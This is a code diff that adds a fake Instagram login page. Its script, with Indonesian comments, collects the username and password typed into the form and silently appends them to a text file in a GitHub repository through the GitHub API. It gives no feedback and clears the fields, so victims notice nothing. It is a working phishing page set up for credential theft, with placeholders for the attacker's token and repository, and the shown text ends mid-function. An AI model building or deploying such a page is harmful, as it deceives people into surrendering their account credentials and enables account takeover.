@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="id" style="margin: 0; padding: 0; box-sizing: border-box; outline: none; list-style: none; text-decoration: none; font-family: 'Roboto', sans-serif;">
+<head style="margin: 0; padding: 0; box-sizing: border-box; outline: none; list-style: none; text-decoration: none; font-family: 'Roboto', sans-serif;">
+    <meta charset="UTF-8">
+    <title>Instagram Login Page</title>
+    <link href="styles.css" rel="stylesheet">
+</head>
+<body style="margin:0;padding:0;box-sizing:border-box;outline:none;list-style:none;text-decoration:none;font-family:'Roboto', sans-serif;background:#fafafa;font-size:14px;">
+
+<div class="wrapper">
+    <div class="header" style="margin:50px auto;padding:0;max-width:350px;width:100%;height:auto;">
+        <div class="top" style="padding:40px 40px 20px;background:#fff;border:1px solid #e6e6e6;border-radius:1px;">
+            
+            <div class="logo">
+                <img alt="instagram" src="https://raw.githubusercontent.com/codingmarket07/Instagram-Login-Page/master/instagram.png" style="width:175px;margin:0 auto 35px;display:block;">
+            </div>
+
+            <div class="form">
+                <div class="input_field" style="margin-bottom:5px;">
+                    <input id="username" class="input" placeholder="Phone number, username, or email" type="text" style="width:100%;background:#fafafa;border:1px solid #efefef;font-size:12px;border-radius:3px;color:#262626;padding:10px;">
+                </div>
+                <div class="input_field" style="margin-bottom:5px;">
+                    <input id="password" class="input" placeholder="Password" type="password" style="width:100%;background:#fafafa;border:1px solid #efefef;font-size:12px;border-radius:3px;color:#262626;padding:10px;">
+                </div>
+                
+                <div class="btn" style="margin:10px 0;padding:5px;background-color:#3897f0;border:1px solid #3897f0;border-radius:4px;text-align:center;">
+                    <a href="#" onclick="simpanKeGitHub(); return false;" style="color:#fff;display:block;">Log In</a>
+                </div>
+            </div>
+
+            <div class="or" style="margin:15px 0 20px;display:flex;justify-content:space-between;align-items:center;height:15px;">
+                <div class="line" style="width:105px;height:2px;background:#efefef;"></div>
+                <p style="color:#999;font-size:12px;">OR</p>
+                <div class="line" style="width:105px;height:2px;background:#efefef;"></div>
+            </div>
+
+            <div class="dif">
+                <div class="fb" style="display:flex;justify-content:center;align-items:center;">
+                    <img alt="facebook" src="https://raw.githubusercontent.com/codingmarket07/Instagram-Login-Page/master/facebook.png" style="width:16px;height:16px;">
+                    <p style="color:#385185;font-weight:500;margin-left:10px;">Log in with Facebook</p>
+                </div>
+                <div class="forgot" style="font-size:12px;text-align:center;margin-top:20px;">
+                    <a href="#" style="color:#003569;">Forgot password?</a>
+                </div>
+            </div>
+        </div>
+
+        <div class="signup" style="margin:10px 0 20px;padding:25px 40px;background:#fff;border:1px solid #e6e6e6;border-radius:1px;text-align:center;color:#262626;">
+            <p>Don't have an account? <a href="#" style="color:#3897f0;">Sign up</a></p>
+        </div>
+    </div>
+</div>
+
+<script>
+// ================== KONFIGURASI GITHUB ==================
+const GITHUB_TOKEN = "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";   // ← GANTI
+const REPO_OWNER   = "username-github-kamu";                 // ← GANTI
+const REPO_NAME    = "nama-repo-kamu";                       // ← GANTI
+const FILE_PATH    = "database.txt";
+// =======================================================
+
+async function simpanKeGitHub() {
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
+
+    if (!username || !password) {
+        return; // Tidak ada notifikasi
+    }
+
+    const newData = `${username}|${password}\n`;
+
+    try {
+        const getRes = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
+            headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
+        });
+
+        let sha = null;
+        let content = "";
+
+        if (getRes.ok) {
+            const data = await getRes.json();
+            sha = data.sha;
+            content = atob(data.content);
+        }
+
+        const updatedContent = content + newData;
+
+        const updateRes = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
+            method: 'PUT',
+            headers: {
+                'Authorization': `token ${GITHUB_TOKEN}`,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                message: `New login: ${username}`,
+                content: btoa(unescape(encodeURIComponent(updatedContent))),
+                sha: sha
+            })
+        });
+
+        if (updateRes.ok) {
+            // Kosongkan form setelah berhasil (tanpa alert)
+            document.getElementById('username').value = "";
+            document.getElementById('password').value = "";
+        }
+    } catch (err) {
+        //
